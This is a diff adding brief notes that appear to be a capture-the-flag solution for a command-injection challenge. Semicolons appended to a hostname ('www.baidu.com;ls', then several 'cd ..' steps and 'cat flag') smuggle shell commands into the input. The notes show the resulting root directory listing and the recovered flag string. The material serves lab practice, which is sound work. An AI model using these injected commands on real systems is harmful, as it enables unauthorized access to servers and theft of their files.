@@ -1,0 +1,25 @@
+use ; 
+
+www.baidu.com;ls
+www.baidu.com;cd ..;cd ..;cd ..;ls    page shows:
+bin
+dev
+etc
+flag
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+www.baidu.com;cd ..;cd ..;cd ..; cat flag
+flag{f83d34f5-c5cb-4e63-89b2-b075e4d91bf9}
